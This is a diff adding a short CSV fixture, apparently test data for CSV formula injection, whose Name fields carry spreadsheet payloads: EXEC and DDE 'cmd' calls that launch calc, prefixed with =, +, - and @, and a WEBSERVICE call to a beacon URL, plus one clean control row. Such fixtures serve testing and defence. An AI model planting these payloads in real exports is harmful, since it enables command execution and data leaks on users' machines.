@@ -1,0 +1,7 @@
+Name,Email,Score
+=EXEC("calc.exe"),victim@example.com,100
++cmd|" /C calc"!A1,user2@example.com,200
+-2+3+cmd|" /C calc"!A2,user3@example.com,300
+=WEBSERVICE("http://192.168.1.1/csv-formula-beacon"),user4@example.com,400
+@SUM(1+1)*cmd|" /C calc"!A3,user5@example.com,500
+clean_user,clean@example.com,600
